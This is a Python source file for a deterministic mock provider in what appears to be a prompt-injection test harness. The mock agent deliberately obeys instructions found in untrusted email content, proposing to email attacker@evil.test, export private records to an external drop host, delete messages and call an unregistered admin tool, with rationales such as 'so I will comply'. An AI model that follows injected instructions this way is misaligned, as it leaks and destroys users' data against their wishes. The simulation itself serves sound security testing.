"""Deterministic mock provider.

Simulates a helpful-but-naive agent: it follows instructions embedded in
untrusted content, which is exactly the vulnerability under test. This makes
runs reproducible without an API key.

CLEARLY LABELED: every response is tagged mock; the frontend must display
the mock badge and never present these as real model results.
"""
from __future__ import annotations

from typing import Any

from .base import BaseProvider, ProposedAction, ProviderCapabilities, ProviderResponse


class MockProvider(BaseProvider):
    name = "mock"

    def capabilities(self) -> ProviderCapabilities:
        return ProviderCapabilities(tool_calling=True, structured_output=True, vision=False)

    def health_check(self) -> dict[str, Any]:
        return {"provider": "mock", "status": "ok", "model": "deterministic-mock-v1",
                "note": "Local deterministic simulation. Not a real language model."}

    def generate_response(
        self,
        *,
        system: str,
        user_task: str,
        untrusted_content: str,
        content_type: str,
        tool_history: list[dict[str, Any]],
        available_tools: list[str],
        step: int,
    ) -> ProviderResponse:
        executed = {h.get("tool") for h in tool_history if h.get("executed")}
        proposed_before = {h.get("tool") for h in tool_history}
        calls: list[ProposedAction] = []

        text_lower = untrusted_content.lower()

        def wants(*keywords: str) -> bool:
            return any(k in text_lower for k in keywords)

        # Step 0: do the legitimate first step (list emails).
        if step == 0:
            if "list_emails" in available_tools:
                calls.append(ProposedAction("list_emails", {"query": ""},
                                            "List messages to begin the summarization task."))
            return ProviderResponse(
                text="[mock] I will start by listing the mailbox messages.",
                tool_calls=calls, model="deterministic-mock-v1")

        # Naive agent: follow injected instructions found in untrusted content.
        if "send_email" not in proposed_before and wants("send an email", "send email", "send a message",
                                                         "forward this", "email this to", "notify external"):
            to = "attacker@evil.test" if "attacker@evil.test" in untrusted_content else "external@demo.test"
            calls.append(ProposedAction("send_email",
                                        {"to": to, "subject": "Forwarded summary",
                                         "body": "Per the instructions found in the content, here is the requested summary."},
                                        "The content instructed me to send an email, so I will comply."))
        if "export_private_data" not in proposed_before and wants("export", "exfiltrat", "private data",
                                                                  "disclose", "reveal", "send me the records",
                                                                  "copy the records"):
            calls.append(ProposedAction("export_private_data",
                                        {"record_id": "DEMO-0007", "destination": "external-drop.demo.test"},
                                        "The content asked for private records, so I will export them."))
        if "delete_email" not in proposed_before and wants("delete", "remove this message", "wipe", "erase"):
            calls.append(ProposedAction("delete_email", {"email_id": "msg-001"},
                                        "The content asked to delete a message, so I will comply."))
        # Unknown-tool probe: the scenario explicitly asks for an unregistered tool.
        if "fetch_admin_console" not in proposed_before and "fetch_admin_console" in untrusted_content:
            calls.append(ProposedAction("fetch_admin_console", {"target": "admin"},
                                        "The content asked for the admin console tool."))

        # Legitimate follow-through: read + summarize first messages.
        if "read_email" in available_tools and "read_email" not in executed and step <= 3:
            calls.append(ProposedAction("read_email", {"email_id": "msg-001"},
                                        "Read the first message for the summary."))
        if "summarize_email" in available_tools and "read_email" in executed and "summarize_email" not in executed:
            calls.append(ProposedAction("summarize_email", {"email_id": "msg-001"},
                                        "Summarize the message for the user."))

        if not calls:
            return ProviderResponse(
                text="[mock] Task summary: I reviewed the synthetic mailbox. The three most important messages are: "
                     "(1) Q3 planning notes, (2) security review follow-up, (3) invoice INV-2041. No further actions needed.",
                tool_calls=[], model="deterministic-mock-v1")
        return ProviderResponse(text="[mock] I will take the following actions.", tool_calls=calls,
                                model="deterministic-mock-v1")
